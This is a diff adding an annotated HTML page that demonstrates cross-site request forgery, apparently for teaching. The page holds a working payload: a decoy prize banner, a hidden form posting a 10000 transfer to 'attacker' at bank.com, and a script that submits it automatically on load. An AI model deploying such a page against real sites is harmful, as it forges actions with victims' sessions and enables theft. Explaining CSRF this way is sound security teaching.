@@ -1,0 +1,18 @@
+<!-- ❌ attacker.html — hosted on evil.com.
+     If your app performs a state change on a request that trusts ONLY the
+     auto-sent session cookie (no CSRF token), this page silently runs it
+     using the logged-in victim's session. -->
+<h1>You won a prize! 🎉 Click to claim…</h1>
+
+<form id="f" action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="10000">
+</form>
+<script>
+  // auto-submit — no click needed
+  document.getElementById('f').submit()
+</script>
+
+<!-- The victim's browser attaches their bank.com cookie AUTOMATICALLY on the
+     cross-site POST. The server sees a valid session → executes the transfer.
+     That is CSRF: the request is forged, but authenticated by the ambient cookie. -->
